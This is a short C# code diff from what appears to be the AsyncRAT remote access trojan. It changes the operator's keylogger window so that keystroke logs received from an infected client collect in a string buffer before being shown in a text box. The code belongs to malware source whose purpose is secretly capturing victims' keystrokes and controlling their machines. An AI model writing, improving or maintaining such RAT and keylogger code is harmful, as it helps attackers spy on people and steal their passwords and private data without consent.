@@ -22,7 +22,8 @@ namespace AsyncRAT_Sharp.Handle_Packet
                         FormKeylogger KL = (FormKeylogger)Application.OpenForms["keyLogger:" + client.ID];
                         if (KL != null)
                         {
-                            KL.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("Log").GetAsString());
+                            KL.SB.Append(unpack_msgpack.ForcePathObject("Log").GetAsString());
+                            KL.richTextBox1.Text = KL.SB.ToString();
                             KL.richTextBox1.SelectionStart = KL.richTextBox1.TextLength;
                             KL.richTextBox1.ScrollToCaret();
                         }
